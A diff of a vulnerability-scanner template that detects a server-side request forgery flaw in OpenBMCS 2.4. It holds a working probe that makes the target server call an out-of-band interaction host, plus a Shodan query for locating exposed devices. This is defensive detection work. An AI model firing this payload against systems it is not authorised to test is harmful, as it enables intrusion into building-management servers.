@@ -1,5 +1,4 @@
 id: openbmcs-ssrf
-
 info:
   name: OpenBMCS 2.4 - Server-Side Request Forgery /  Remote File Inclusion
   author: dhiyaneshDK
@@ -13,11 +12,10 @@ info:
     cvss-score: 6.8
     cwe-id: CWE-918
   metadata:
-    runzero-review: REJECT/2025-11-17/uses interactsh
+    runzero-match: service["favicon.ico.image.mmh3"] == "1550906681"
     max-request: 1
     shodan-query: http.favicon.hash:1550906681
   tags: ssrf,oast,openbmcs,edb,misconfig,vuln
-
 http:
   - raw:
       - |
@@ -26,15 +24,12 @@ http:
         Content-Type: application/x-www-form-urlencoded; charset=UTF-8
 
         ip={{interactsh-url}}:80&argu=/
-
     matchers-condition: and
     matchers:
       - type: word
         part: interactsh_protocol # Confirms the DNS Interaction
         words:
           - "http"
-
       - type: status
         status:
           - 302
-
